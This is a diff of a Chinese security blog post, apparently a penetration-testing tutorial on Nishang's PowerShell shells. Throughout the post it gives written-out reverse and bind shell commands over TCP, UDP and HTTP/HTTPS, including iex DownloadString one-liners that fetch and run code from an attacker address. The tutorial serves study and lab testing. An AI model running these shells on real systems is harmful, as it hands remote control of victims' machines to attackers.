@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,30 +109,30 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="nishang之花样shell">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Nishang_shells.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="nishang之花样shell 0x00 简介Nishang是基于PowerShell的渗透测试专用工具。集成了框架、脚本和各种payload。本篇主要介绍nishang中的各种shell。主要针对预装有powershell的系统。 0x01 TCP shell1.Reverse shellAttacker执行:12root@kali:~# nc -lvp 4444listening on [an">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1112621749.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/4198618951.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/231743183.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3362905010.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/292774351.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3877916853.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1220677167.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2372449638.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1355652964.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2394393882.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1833119793.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/4158712833.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1637791151.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/650362795.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/237234968.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1787636319.png">
 <meta property="og:updated_time" content="2019-01-15T05:43:36.772Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="nishang之花样shell">
 <meta name="twitter:description" content="nishang之花样shell 0x00 简介Nishang是基于PowerShell的渗透测试专用工具。集成了框架、脚本和各种payload。本篇主要介绍nishang中的各种shell。主要针对预装有powershell的系统。 0x01 TCP shell1.Reverse shellAttacker执行:12root@kali:~# nc -lvp 4444listening on [an">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1112621749.png">
 
 
 
@@ -495,89 +512,89 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><h1 id="nishang之花样shell"><a href="#nishang之花样shell" class="headerlink" title="nishang之花样shell"></a>nishang之花样shell</h1><hr>
+        <h1 id="nishang之花样shell"><a href="#nishang之花样shell" class="headerlink" title="nishang之花样shell"></a>nishang之花样shell</h1><hr>
 <h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Nishang是基于PowerShell的渗透测试专用工具。集成了框架、脚本和各种payload。本篇主要介绍nishang中的各种shell。<code>主要针对预装有powershell的系统</code>。</p>
-<h2 id="0x01-TCP-shell"><a href="#0x01-TCP-shell" class="headerlink" title="0x01 TCP shell"></a>0x01 TCP shell</h2><h3 id="1-Reverse-shell"><a href="#1-Reverse-shell" class="headerlink" title="1.Reverse shell"></a>1.Reverse shell</h3><p>Attacker执行:<br></p><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">4444</span> ..</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="0x01-TCP-shell"><a href="#0x01-TCP-shell" class="headerlink" title="0x01 TCP shell"></a>0x01 TCP shell</h2><h3 id="1-Reverse-shell"><a href="#1-Reverse-shell" class="headerlink" title="1.Reverse shell"></a>1.Reverse shell</h3><p>Attacker执行:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">4444</span> ..</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
-<p>Victim执行:<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">Invoke-PowerShellTcp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">Invoke-PowerShellTcp</span> <span class="selector-tag">-Reverse</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.129</span> <span class="selector-tag">-Port</span> 4444</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>Victim执行:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">Invoke-PowerShellTcp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">Invoke-PowerShellTcp</span> <span class="selector-tag">-Reverse</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.129</span> <span class="selector-tag">-Port</span> 4444</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.129 为Attacker IP地址。</p>
 </blockquote>
-<p>效果如下：<br></p><div class="progress-images" style="width:1245px"><div class="progress-images--placeholder" style="padding-bottom: 39.91967871485944%;"></div><img src="/images/loading.svg" alt="1442384621920.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1112621749.png" data-thumb="/images/thumb/bf9869c9cf52a47c3fdba65cfebad784.png"></div><p></p>
+<p>效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/1112621749.png" alt="1442384621920.png"></p>
 <p>数据报文如下：</p>
-<p></p><div class="progress-images" style="width:916px"><div class="progress-images--placeholder" style="padding-bottom: 83.84279475982532%;"></div><img src="/images/loading.svg" alt="1442384891316.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/4198618951.png" data-thumb="/images/thumb/80687d4af717929f1d2a07fc262f73d2.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/4198618951.png" alt="1442384891316.png"></p>
 <p>从报文可以看出所有数据通过TCP传输，并且执行的命令以及返回的结果均在报文中可见。</p>
-<h3 id="2-Bind-shell"><a href="#2-Bind-shell" class="headerlink" title="2.Bind shell"></a>2.Bind shell</h3><p>Victim 执行：<br></p><figure class="highlight livescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:<span class="string">\Shells></span> . .<span class="string">\Invoke-PowerShellTcp.ps1</span></span><br><span class="line">PS F:<span class="string">\Shells></span> Invoke-PowerShellTcp -Bind -Port <span class="number">8888</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>Attacker 执行：<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">powercat</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">powercat</span> <span class="selector-tag">-c</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-v</span> <span class="selector-tag">-p</span> 8888</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h3 id="2-Bind-shell"><a href="#2-Bind-shell" class="headerlink" title="2.Bind shell"></a>2.Bind shell</h3><p>Victim 执行：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellTcp.ps1</span></span><br><span class="line">PS F:<span class="string">\Shells&gt;</span> Invoke-PowerShellTcp -Bind -Port <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
+<p>Attacker 执行：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">powercat</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">powercat</span> <span class="selector-tag">-c</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-v</span> <span class="selector-tag">-p</span> 8888</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.1 为Victim IP地址。</p>
 </blockquote>
-<p>结果如下：<br></p><div class="progress-images" style="width:1342px"><div class="progress-images--placeholder" style="padding-bottom: 35.02235469448584%;"></div><img src="/images/loading.svg" alt="1442388856435.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/231743183.png" data-thumb="/images/thumb/3a2d9aa9ad24d2f4b88202bad4b3699b.png"></div><p></p>
-<h2 id="0x02-UDP-Shell"><a href="#0x02-UDP-Shell" class="headerlink" title="0x02 UDP Shell"></a>0x02 UDP Shell</h2><h3 id="1-Reverse-shell-1"><a href="#1-Reverse-shell-1" class="headerlink" title="1.Reverse shell"></a>1.Reverse shell</h3><p>Attacker执行:<br></p><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvup 53</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">53</span> ...</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>Victim执行:<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">Invoke-PowerShellUdp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">Invoke-PowerShellUdp</span> <span class="selector-tag">-Reverse</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.129</span> <span class="selector-tag">-Port</span> 53</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>结果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/231743183.png" alt="1442388856435.png"></p>
+<h2 id="0x02-UDP-Shell"><a href="#0x02-UDP-Shell" class="headerlink" title="0x02 UDP Shell"></a>0x02 UDP Shell</h2><h3 id="1-Reverse-shell-1"><a href="#1-Reverse-shell-1" class="headerlink" title="1.Reverse shell"></a>1.Reverse shell</h3><p>Attacker执行:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvup 53</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">53</span> ...</span><br></pre></td></tr></table></figure></p>
+<p>Victim执行:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">Invoke-PowerShellUdp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">Invoke-PowerShellUdp</span> <span class="selector-tag">-Reverse</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.129</span> <span class="selector-tag">-Port</span> 53</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.129 为Attacker IP地址。</p>
 </blockquote>
-<p>效果如下：<br></p><div class="progress-images" style="width:1294px"><div class="progress-images--placeholder" style="padding-bottom: 27.125193199381762%;"></div><img src="/images/loading.svg" alt="1442385502537.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/3362905010.png" data-thumb="/images/thumb/add41bfcaeae9abd9eb530ccf340a0a7.png"></div><p></p>
+<p>效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/3362905010.png" alt="1442385502537.png"></p>
 <p>数据报文如下：</p>
-<p></p><div class="progress-images" style="width:919px"><div class="progress-images--placeholder" style="padding-bottom: 71.92600652883569%;"></div><img src="/images/loading.svg" alt="1442385603753.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/292774351.png" data-thumb="/images/thumb/3f971787140d8f1f77c967a64bc9fbb1.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/292774351.png" alt="1442385603753.png"></p>
 <p>从报文可以看出所有数据通过UDP传输，并且执行的命令以及返回的结果均在报文中可见。</p>
-<p>并且这种方式支持IPV6，如下图：<br></p><div class="progress-images" style="width:1305px"><div class="progress-images--placeholder" style="padding-bottom: 25.517241379310345%;"></div><img src="/images/loading.svg" alt="1442386812443.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/3877916853.png" data-thumb="/images/thumb/ec4193e9b5529ba73e6666a13a1d7fb9.png"></div><p></p>
-<h3 id="2-Bind-shell-1"><a href="#2-Bind-shell-1" class="headerlink" title="2.Bind shell"></a>2.Bind shell</h3><p>Victim执行:<br></p><figure class="highlight livescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:<span class="string">\Shells></span> . .<span class="string">\Invoke-PowerShellUdp.ps1</span></span><br><span class="line">PS F:<span class="string">\Shells></span> Invoke-PowerShellUdp -Bind -Port <span class="number">7777</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>Attacker执行:<br></p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -vtu 192.168.52.1 7777</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>并且这种方式支持IPV6，如下图：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/3877916853.png" alt="1442386812443.png"></p>
+<h3 id="2-Bind-shell-1"><a href="#2-Bind-shell-1" class="headerlink" title="2.Bind shell"></a>2.Bind shell</h3><p>Victim执行:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellUdp.ps1</span></span><br><span class="line">PS F:<span class="string">\Shells&gt;</span> Invoke-PowerShellUdp -Bind -Port <span class="number">7777</span></span><br></pre></td></tr></table></figure></p>
+<p>Attacker执行:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -vtu 192.168.52.1 7777</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.1 为Victim IP地址。</p>
 </blockquote>
-<p>效果如下：<br></p><div class="progress-images" style="width:1042px"><div class="progress-images--placeholder" style="padding-bottom: 30.038387715930902%;"></div><img src="/images/loading.svg" alt="1442389659018.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1220677167.png" data-thumb="/images/thumb/0297fec078db9453a6d7aa8b46345bfc.png"></div><p></p>
+<p>效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/1220677167.png" alt="1442389659018.png"></p>
 <h2 id="0x03-HTTP-HTTPS-shell"><a href="#0x03-HTTP-HTTPS-shell" class="headerlink" title="0x03 HTTP/HTTPS shell"></a>0x03 HTTP/HTTPS shell</h2><blockquote>
 <p>这里要说明一下Invoke-PoshRatHttp/Invoke-PoshRatHttps 需要Attacker以管理员身份运行</p>
 </blockquote>
 <h3 id="1-HTTP"><a href="#1-HTTP" class="headerlink" title="1. HTTP"></a>1. HTTP</h3><p>Attacker执行:</p>
-<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">Invoke-PoshRatHttp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">Invoke-PoshRatHttp</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-Port</span> 80</span><br><span class="line"><span class="selector-tag">Listening</span> <span class="selector-tag">on</span> 80</span><br></pre></td></tr></tbody></table></figure>
-<p>Victim执行:<br></p><figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">evi1cg</span>> <span class="selector-tag">iex</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.52.1/connect"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">Invoke-PoshRatHttp</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">Invoke-PoshRatHttp</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-Port</span> 80</span><br><span class="line"><span class="selector-tag">Listening</span> <span class="selector-tag">on</span> 80</span><br></pre></td></tr></table></figure>
+<p>Victim执行:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">evi1cg</span>&gt; <span class="selector-tag">iex</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.52.1/connect"</span>)</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>192.168.52.1 为Attacker IP地址。</p>
 </blockquote>
-<p>效果如下：<br></p><div class="progress-images" style="width:1225px"><div class="progress-images--placeholder" style="padding-bottom: 20.163265306122447%;"></div><img src="/images/loading.svg" alt="1442408481171.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/2372449638.png" data-thumb="/images/thumb/248f38764339b2035adba4b2a7769621.png"></div><p></p>
+<p>效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/2372449638.png" alt="1442408481171.png"></p>
 <p>数据包如下：</p>
-<p></p><div class="progress-images" style="width:908px"><div class="progress-images--placeholder" style="padding-bottom: 72.4669603524229%;"></div><img src="/images/loading.svg" alt="1442408529013.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1355652964.png" data-thumb="/images/thumb/a76d19adfe51d2149d3f9be3b5587747.png"></div><br>从报文可以看出所有数据通过HTTP传输，并且执行的命令以及返回的结果均在报文中可见。<p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1355652964.png" alt="1442408529013.png"><br>从报文可以看出所有数据通过HTTP传输，并且执行的命令以及返回的结果均在报文中可见。</p>
 <h3 id="2-HTTPS"><a href="#2-HTTPS" class="headerlink" title="2. HTTPS"></a>2. HTTPS</h3><p>笔者测试使用nishang作者最新的脚本出现错误如下：<br>Attacker执行:</p>
-<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">Invoke-PoshRatHttps</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">Invoke-PoshRatHttps</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-Port</span> 8443</span><br><span class="line"><span class="selector-tag">Listening</span> <span class="selector-tag">on</span> 8443</span><br><span class="line">6<span class="selector-tag">D559E5925FBCC8BE5FB3257F503CB8A6C5791A7</span></span><br></pre></td></tr></tbody></table></figure>
-<p>Victim执行:<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"https://192.168.52.1:8443/connect"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>报错信息如下：<br></p><div class="progress-images" style="width:1306px"><div class="progress-images--placeholder" style="padding-bottom: 33.537519142419605%;"></div><img src="/images/loading.svg" alt="1442410530974.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/2394393882.png" data-thumb="/images/thumb/0ca340a9ca4ad9fc777ee708bbad4b63.png"></div><p></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">Invoke-PoshRatHttps</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">Invoke-PoshRatHttps</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-Port</span> 8443</span><br><span class="line"><span class="selector-tag">Listening</span> <span class="selector-tag">on</span> 8443</span><br><span class="line">6<span class="selector-tag">D559E5925FBCC8BE5FB3257F503CB8A6C5791A7</span></span><br></pre></td></tr></table></figure>
+<p>Victim执行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;;iex (<span class="keyword">New</span>-Object Net.WebClient).DownloadString(<span class="string">"https://192.168.52.1:8443/connect"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>报错信息如下：<br><img src="https://evi1cg.github.io/usr/uploads/2015/10/2394393882.png" alt="1442410530974.png"></p>
 <p>找到历史版本中的文件进行测试成功，<a href="https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1" target="_blank" rel="noopener">Invoke-PoshRatHttps.ps1</a><br>Attacker执行:</p>
-<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> . .\<span class="selector-tag">Invoke-PoshRatHttps</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>> <span class="selector-tag">Invoke-PoshRatHttps</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-Port</span> 80 <span class="selector-tag">-SSLPort</span> 443</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; . .\<span class="selector-tag">Invoke-PoshRatHttps</span><span class="selector-class">.ps1</span></span><br><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">F</span>:\<span class="selector-tag">Shells</span>&gt; <span class="selector-tag">Invoke-PoshRatHttps</span> <span class="selector-tag">-IPAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.52</span><span class="selector-class">.1</span> <span class="selector-tag">-Port</span> 80 <span class="selector-tag">-SSLPort</span> 443</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>这里如果出现<em>“另一个程序正在使用此文件，进程无法访问</em>的错误时，可以更换SSLPort端口</p>
 </blockquote>
 <p>Victim执行(<em>这里受害者请求的是HTTP</em>):</p>
-<figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">evi1cg</span>> <span class="selector-tag">iex</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.52.1/connect"</span>)</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PS</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">evi1cg</span>&gt; <span class="selector-tag">iex</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">"http://192.168.52.1/connect"</span>)</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>192.168.52.1 为Attacker IP地址。</p>
 </blockquote>
 <p>效果如下：</p>
-<p></p><div class="progress-images" style="width:1331px"><div class="progress-images--placeholder" style="padding-bottom: 25.469571750563485%;"></div><img src="/images/loading.svg" alt="1442411108781.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/10/1833119793.png" data-thumb="/images/thumb/8481268fb6585b69569f23c6889b51d8.png"></div><p></p>
